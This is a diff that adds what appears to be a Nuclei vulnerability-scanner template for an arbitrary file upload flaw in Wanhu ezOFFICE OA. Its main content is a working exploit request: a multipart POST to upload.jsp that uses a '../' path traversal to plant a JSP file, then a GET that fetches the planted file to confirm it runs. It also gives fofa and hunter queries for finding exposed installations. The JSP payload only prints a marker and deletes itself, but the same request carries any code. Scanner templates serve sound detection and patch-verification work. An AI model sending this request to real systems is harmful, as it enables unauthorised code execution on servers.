@@ -1,0 +1,59 @@
+id: wanhu-ezoffice-upload-fileupload
+
+info:
+  name: 万户 ezoffice upload.jsp - fileupload
+  author: xiuxin
+  severity: critical
+  description: 万户 ezoffice upload.jsp 任意文件上传
+  reference:
+    - none
+  metadata:
+    veified: true
+    max-request: 1
+    hunter-query: app.name="万户 Ezoffice OA"
+    fofa-query: app="万户网络-ezOFFICE"  
+  tags: wanhu,oa,fileupload,ezoffice
+  
+http:
+  - raw:
+      - |
+        POST /defaultroot/platform/portal/layout/common/upload.jsp?portletSettingId=1&path=../platform/portal/com/ HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Moziilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/116.0.0.0Safari/537.36
+        Connection: close
+        Content-Type: multipart/form-data;boundary=----WebKitFormBoundarykIU0ZM0wGHiH6FRd
+        Content-Length: 245
+        
+        ------WebKitFormBoundarykIU0ZM0wGHiH6FRd
+        Content-Disposition:form-data;name="file";filename="cnvd.jsp"
+        content-type:image/pne
+        
+        <%out.print("{{randstr}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        ------WebKitFormBoundarykIU0ZM0wGHiH6FRd--
+
+      - |
+        GET /defaultroot/platform/portal/com/{{path}}/{{file}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Moziilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36
+
+    extractors:
+      - type: regex
+        name: path
+        part: body
+        group: 1
+        internal: true
+        regex:
+          - "'(\\d{6})"
+
+      - type: regex
+        name: file
+        part: body
+        internal: true
+        regex:
+          - '[0-9]{25}.jsp'
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && status_code_2 == 200
+          - contains(body_2,'{{randstr}}')
+        condition: and
